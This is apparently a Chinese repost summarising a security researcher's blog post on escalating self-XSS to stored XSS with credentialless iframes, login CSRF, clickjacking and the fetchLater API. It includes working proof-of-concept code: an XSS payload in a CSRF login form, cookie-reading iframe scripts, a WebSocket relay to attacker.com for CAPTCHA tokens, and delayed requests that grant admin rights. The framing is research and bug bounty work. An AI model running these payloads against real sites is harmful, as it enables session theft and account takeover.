> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&mid=2247530905&idx=1&sn=7008b1da8378c0c1c830f9b7863867e2

#  让 Self-XSS 再次伟大  
 Ots安全   2025-06-15 06:08  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
《Make Self-XSS Great Again》是一篇由 Slonser Notes 发布的博客文章，发布于 2025 年 6 月 13 日，旨在为安全研究人员和专业人士提供深入探讨如何将传统的 Self-XSS（自助式跨站脚本攻击）漏洞升级为更具威胁性的 Stored XSS（存储型跨站脚本攻击）的技术性指南。该文章特别针对在授权测试范围内的安全专家，明确声明其内容仅用于合法的渗透测试，并免除作者对不当使用所导致的任何损害的责任。  
  
  
文章核心内容  
  
文章从安全研究中常见的困境入手，即许多 XSS 漏洞因需要攻击者在目标账户内执行复杂操作而难以利用，导致其实际价值被低估，特别是在漏洞赏金计划中常被归类为低优先级或“无法利用”的问题。作者通过分析现代浏览器技术的进步，特别是 credentialless iframe（无凭证 iframe）的引入，提出了一种创新的方法来突破这一限制。  
1. Credentialless Iframe 的作用  
  
文章详细解释了 credentialless iframe 的工作机制，这种技术通过创建新的短暂上下文加载页面，从而避免使用原始会话的凭证。作者通过代码示例（如使用   
<iframe src="http://victim.domain/" credentialless>  
）展示了如何在不依赖目标会话的情况下加载页面，并通过与常规 iframe 的同源特性实现跨上下文操作。例如，攻击者可以在 credentialless iframe 中执行恶意脚本，访问并操纵原始页面的 cookie（如   
window.top[1].document.cookie  
），从而实现会话劫持或账户接管。  
  
1. 结合 CSRF 攻击的升级策略  
  
作者进一步探讨了如何将 Self-XSS 与 CSRF（跨站请求伪造）结合，尤其是针对登录表单的攻击。文章提供了一个具体的 PoC（攻击证明），通过构造一个包含恶意用户名（如   
<img src=x onerror=eval(window.name)>  
）的 CSRF 表单，诱导用户登录攻击者账户，并在 credentialless iframe 中执行脚本，提取受害者与攻击者的 cookie 值。作者还讨论了在登录表单存在 CAPTCHA（验证码）的情况下如何调整策略，通过 WebSocket 实现动态获取验证码并继续攻击。  
  
1. 替代方法：Clickjacking 与 fetchLater API  
  
当目标网站启用   
X-Frame-Options: Deny  
 阻止 iframe 加载时，文章介绍了 Clickjacking（点击劫持）作为替代手段，通过伪装用户界面诱导受害者在攻击者控制的页面上输入凭证。更为创新的是，作者提到了 2025 年春季引入的   
fetchLater  
 API，该 API 允许在页面关闭后延迟发送请求，从而在受害者下次登录时以其当前 cookie 执行恶意操作。这一技术显著扩展了 Self-XSS 的攻击窗口。  
  
  
  
  
介绍  
  
许多安全研究人员都经历过发现 XSS 漏洞的痛苦经历，这种漏洞需要在账户内执行复杂的操作，实际上只能在攻击者的账户上重现，从而失去了实用价值。许多漏洞赏金猎人可能都收到过来自分类团队的类似回复：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczGMsy4yCZ2qTuE6Hvsu3nVmWzdvplxE302MCm9McTFAHJ8yqLJLQuul2eDC2RtuWCKjr3B1aicicA/640?wx_fmt=png&from=appmsg "")  
  
本文的目的是证明，人们通常认为的东西实际上可以通过使用现代浏览器功能Stored Self-XSS转变为常规的东西。Stored XSS  
  
无凭证时代  
  
此类漏洞面临的关键挑战是以下困境：  
1. 为了执行有用的 XSS 有效载荷，我们需要登录攻击者的帐户  
  
1. 如果我们登录攻击者的帐户，攻击就失去了目的，因为我们将处于攻击者的会话中，并且无法访问原始会话  
  
然而，这种方法已经过时了，其原因是无凭证的 iframe  
  
这会导致使用新的、短暂的上下文加载无凭证中的文档<iframe>——这些上下文无法访问与其来源相关的数据  
  
实际上，这意味着如果我们打开包含以下内容的 HTML 页面：  
  

```
<iframe src=&#34;http://victim.domain/&#34; width=&#34;40%&#34; height=&#34;500px&#34; credentialless></iframe>
<iframe src=&#34;http://victim.domain/&#34; width=&#34;40%&#34; height=&#34;500px&#34;></iframe>
```

  
  
我们将看到第一个 iframe 不会有受害者的会话，而第二个 iframe 会有：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczGMsy4yCZ2qTuE6Hvsu3nkZ3Rvq23hiclvBHqxcZ5IL4WCWCFITiamtqyjobuErdZY7eibdWjE1ZCg/640?wx_fmt=png&from=appmsg "")  
  
然而，此功能记录不全，并且该短语those contexts don't have access to the data associated with their origins可能会产生误导。  
  
查看RFC，我们可以看到无凭证 iframe 与常规 iframe 是同源的（其中提到由于实现困难，类似沙盒域的不透明来源并未实现）：  
> 我们提出的无凭证 iframe 模型依赖于分区存储（参见解释），并在存储键中使用 nonce。我们还考虑将不透明来源添加到无凭证 iframe，类似于沙盒 iframe。这将确保无凭证 iframe 在其来源更改为不透明来源后无法访问现有凭证和共享存储。  
>   
> 此解决方案遇到兼容性问题：  
>   
> …  
  
  
无凭证同源问题  
  
无凭证 iframe 与常规 iframe 同源，这对我们来说意味着什么？  
  
让我们考虑以下页面：  
  

```
<iframe src=&#34;https://neplox.security/xss_page_url&#34; width=&#34;20%&#34; height=&#34;20%&#34; credentialless></iframe>
<iframe src=&#34;https://neplox.security/&#34;></iframe>
```

  
  
事实是，如果/xss执行以下代码：  
  

```
window.top[1].document.body.innerHTML = 'Hi from credentialless';
alert(window.top[1].document.cookie);
```

  
  
它将获得该页面原始 cookie 的访问权限：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczGMsy4yCZ2qTuE6Hvsu3nfdQJN1n1SrEfwZ3c6vkJUFKY0AyL7YDyoMvMSH3p59uV4oJ93RRe9Q/640?wx_fmt=png&from=appmsg "")  
  
登录时出现 SELF-XSS + CSRF  
  
假设你发现了一个存储型 SELF-XSS。根据我的经验，一个真实的例子如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczGMsy4yCZ2qTuE6Hvsu3noXYusfH2SK5mZ6KickOATh4LUJPUYY1ObXZCV5gLHuKV2Reet7GAAvg/640?wx_fmt=png&from=appmsg "")  
  
主页显示一条消息Welcome, username!，其中用户名未经过滤，允许任何XSS攻击载荷被插入。这是一个典型的Self-XSS示例。  
  
之后，值得检查一下/login表单。如果它缺少 CSRF 保护，您可以执行以下操作：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczGMsy4yCZ2qTuE6Hvsu3nPB8oSECjBFLYYED6AK11KHJuqH2YAw95b6zzm5hVNKctL7jWZvwjiaw/640?wx_fmt=png&from=appmsg "")  
  
1、创建一个经典的 CSRF 登录表单：  
  

```
<html>
<body>
  <formaction=&#34;http://victim.domain/login&#34;method=&#34;POST&#34;>
    <inputtype=&#34;hidden&#34;name=&#34;username&#34;value=&#34;attacker_username<img src=x onerror=eval(window.name)>&#34; />
    <inputtype=&#34;hidden&#34;name=&#34;password&#34;value=&#34;Super_s@fe_password&#34; />
    <inputtype=&#34;submit&#34;value=&#34;Submit request&#34; />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```

  
  
2、将目标导向以下页面：  
  

```
<iframe name=&#34;window.top[1].document.body.innerHTML = 'edited by slonser</br>' + 'Our cookie is: ' + document.cookie + '\nVictim cookie is: ' + window.top[1].document.cookie;&#34; src=&#34;./logi-csrf-poc.html&#34; width=&#34;40%&#34; height=&#34;500px&#34; credentialless></iframe>
<iframe src=&#34;http://localhost:3004/&#34; width=&#34;40%&#34; height=&#34;500px&#34;></iframe>
```

  
  
3、（可选）将无凭证 iframe 中的用户重定向到触发 SELF-XSS 的 URL，该 URL 随后会在 中执行所需的操作（会话窃取/ATO）window.top[1]。需要注意的是，同一文档中的所有无凭证框架都共享相同的上下文。如果您已经在<iframe src=//example.com credentialless>设置了 Cookie 和 localStorage 的页面上添加了一个，则添加的框架<iframe src=//example.com/path1 credentialless>将可以访问与第一个无凭证框架相同的存储数据。  
  
在我们的例子中，它看起来像这样：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczGMsy4yCZ2qTuE6Hvsu3n5Pq2u5F9SwxngIaOB1bBUuyrXQoADMWpH1SOoqLGyvWfjJPXejIOtw/640?wx_fmt=png&from=appmsg "")  
  
可以看到，我们成功获取了攻击者和受害者的 Cookie 值。要使用受害者的凭证在框架内执行操作，只需调用window.top[1].eval('your code')  
  
使用验证码登录时出现 SELF-XSS + CSRF  
  
有时您可能会遇到登录表单缺乏 CSRF 保护但包含 CAPTCHA 的情况。这种情况不会显著增加漏洞利用的复杂性。关键在于 CAPTCHA 并非 CSRF 保护机制，因为无法保证 CAPTCHA 是在提交的同一设备上被解决的。  
  
在这种情况下，你可以简单地在上一节的攻击中添加一个 CAPTCHA 检索步骤。这是一个简单的客户端实现：  
  

```
const ws = new WebSocket('ws://attacker.com:3004');
ws.onopen = () => {
  ws.send(JSON.stringify({ type: 'visited' }));
};

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  if (data.type === 'captcha') {
    captchaInput.value = data.captchaToken;
  }
};
```

  
  
在服务器端：  
  

```
const WebSocket = require('ws');
const readline = require('readline');

const wss = new WebSocket.Server({ port: 3004 });

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log('WebSocket server is running on port 3004');
wss.on('connection', (ws) => {
    console.log('New client connected');
    ws.on('message', (message) => {
        const data = JSON.parse(message);
        if (data.type === 'visited') {
            console.log('Client sent visited message');
            rl.question('Enter captcha token: ', (token) => {
                ws.send(JSON.stringify({
                    type: 'captcha',
                    captchaToken: token
                }));
            });
        }
    });

    ws.on('close', () => {
        console.log('Client disconnected');
    });
});
```

  
  
这是一个简单的例子，当用户访问网站时，我们会收到一个请求，并需要在控制台中输入验证码令牌（例如，通过代理手动拦截）。显然，对于真正的攻击，你可以实现更复杂的逻辑——这只是为了演示一种可能的实现方法。  
  
SELF-XSS + 点击劫持  
  
如果登录 CSRF 攻击不可用，我们可以使用点击劫持 (Clickjacking)。其核心思想看起来挺有意思的——利用点击劫持，我们需要让用户在登录表单中输入攻击者的凭证（这实际上与传统的攻击方式完全相反，传统的攻击方式是人们试图利用社会工程学让用户在攻击者的表单中输入数据）。  
  
虽然我不是这类技术的专家，但它可能看起来像这样：  
  
1、用户访问攻击者的网站并请求访问  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczGMsy4yCZ2qTuE6Hvsu3nIupa0gIz3jHHFZVwA3KT5op1ZP8D8dqLIyALb40aglIrjHOoPicoefA/640?wx_fmt=png&from=appmsg "")  
  
2、用户收到一封内容如下的电子邮件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczGMsy4yCZ2qTuE6Hvsu3nPTMRTKt6Mxkia9YHhib1OZdNJwdSXEjodvCeYW65EFv7sH42mb6VCtvQ/640?wx_fmt=png&from=appmsg "")  
  
3、用户访问攻击者的网站并使用这些凭证登录，但他们不会在攻击者网站的表单中输入数据，而是在 的表单中输入数据victim.com。（只需从您的网站插入一个带有覆盖层的无凭证表单即可。本文不讨论如何实施点击劫持。）  
  
值得注意的是，由于用户输入的数据是来自attacker.com同一网站，因此所有内容在用户看来都是有效的。普通用户不太可能意识到攻击者正在使用点击劫持技术将他们引导至自己的账户进行攻击。  
  
X-Frame-Options：拒绝  
> 注意：fetchLater 旨在在页面关闭后发送请求，但我不确定在撰写本文时如何让它在页面关闭后正常工作。如果我弄清楚了，我会更新这篇文章。  
  
  
你可能已经注意到，上面描述的技术有一个缺点——只有当我们能把目标网站放在 iframe 中时，它们才会起作用。但是，如果X-Frame-Options: Deny指定了 iframe，我们该怎么办呢？  
  
实际上，2025 年春季推出的另一个新 API 可以帮助我们——fetchLater  
> fetchLater() API 提供了一个接口来请求延迟提取，可以在指定的时间段之后或者在页面关闭或离开时发送。  
  
  
简单来说，这意味着即使标签页已经关闭，我们也可以在一段时间后发送请求。这样一来，即使请求的 cookie 已经发生更改，我们也可以发送包含请求时实际 cookie 的请求。这在什么情况下有用？当我们遇到 Self-XSS 漏洞，并且可以通过一系列请求来提升权限/执行 ATO 时，这种方法就非常有用。具体如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczGMsy4yCZ2qTuE6Hvsu3nsORWFSmd3jhLoDAOu10YI53Ao9o4WgsBgQPG7gsa4pzJmMSwmMkBDw/640?wx_fmt=png&from=appmsg "")  
  
1、使用 csrf-login 打开页面 -window.open('https://victim.domain/csrf')  
  
2、从触发 Self-XSS 的窗口，注册多个不同时间间隔的 fetchLater 请求  
  

```
var req = new Request(&#34;/change_rights&#34;,{method:&#34;POST&#34;,body:JSON.stringify({username:&#34;victim&#34;, rights: &#34;admin&#34;}),credentials:&#34;include&#34;})
const minute = 60000
let arr = [minute, minute * 60, minute * 60 * 24, ...]
for (let timeout of arr)
  fetchLater(req,{activateAfter: timeout})
```

  
  
1、注销攻击者的帐户  
  
当用户下次访问我们攻击的网站并再次登录时，一段时间后，攻击者创建的请求将以他们的名义执行，但会使用当前的 cookie。需要再次强调的是，受害者不应再次访问攻击者的网站，因为该请求已经位于后台队列中。  
  
结论  
  
在现代浏览器中，由于无凭证框架的存在，任何存储型自攻击 XSS 都可以转换为常规 XSS。然而，这通常仍然需要极少的用户交互。  
  
参考  
  
无凭证 iframe 文档  
  
https://developer.mozilla.org/en-US/docs/Web/Security/IFrame_credentialless  
  
匿名 iframe RFC  
  
https://wicg.github.io/anonymous-iframe/[#alternatives]()  
-opaque-origins  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
